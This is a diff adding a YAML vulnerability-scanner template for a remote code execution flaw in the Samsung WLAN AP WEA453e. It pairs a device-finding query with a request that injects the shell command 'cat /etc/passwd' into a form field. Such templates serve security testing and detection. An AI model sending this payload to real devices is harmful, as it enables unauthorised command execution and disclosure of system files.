@@ -1,0 +1,17 @@
+name: Samsung WLAN AP WEA453e RCE
+manual: true
+query: title="Samsung WLAN AP" || app="Chunjs-server" && body="Samsung Electronics"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /(download)/tmp/a.txt
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  description: Samsung WLAN AP WEA453e
+  tags: rce
